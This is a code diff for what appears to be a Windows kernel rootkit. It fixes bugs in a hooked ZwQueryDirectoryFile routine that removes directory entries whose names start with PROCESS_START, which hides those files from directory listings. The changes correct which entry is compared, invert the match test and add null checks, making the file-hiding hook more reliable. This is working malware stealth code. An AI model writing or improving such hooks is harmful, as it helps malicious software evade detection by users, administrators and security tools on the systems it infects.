@@ -325,21 +325,23 @@ NTSTATUS newZwQueryDirectoryFile
 
 		do
 		{
-			if (get_dir_entry_filename(FileInformation, FileInformationClass) != NULL)
+			if (get_dir_entry_filename(currFile, FileInformationClass) != NULL)
 			{
-				if (memcmp(
-					get_dir_entry_filename(FileInformation, FileInformationClass),
+				if (!memcmp(
+					get_dir_entry_filename(currFile, FileInformationClass),
 					PROCESS_START,
-					wcslen(PROCESS_START) * 2
-				) == 0)
+					wcslen(PROCESS_START) * 2))
 				{
 					// if there's more files after the file on the list
 					if (get_next_entry_offset(currFile, FileInformationClass) != NO_MORE_FILES)
 					{
 						delta = ((ULONG)currFile - (ULONG)FileInformation);
 						nBytes = (ULONG)Length - delta;
+
+						if (prevFile)
+							set_next_entry_offset(prevFile, FileInformationClass, get_next_entry_offset(currFile, FileInformationClass));
+
 						RtlCopyMemory((PVOID)currFile, (PVOID)((char*)currFile + get_next_entry_offset(currFile, FileInformationClass)), (DWORD32)nBytes);
-						continue;
 					}
 					// this is the last file on the list
 					else
@@ -355,7 +357,8 @@ NTSTATUS newZwQueryDirectoryFile
 							// if our file is the last one
 							// we need to set the previous file 
 							// to the end
-							set_next_entry_offset(prevFile, FileInformationClass, NO_MORE_FILES);
+							if (prevFile)
+								set_next_entry_offset(prevFile, FileInformationClass, NO_MORE_FILES);
 						}
 					}
 				}
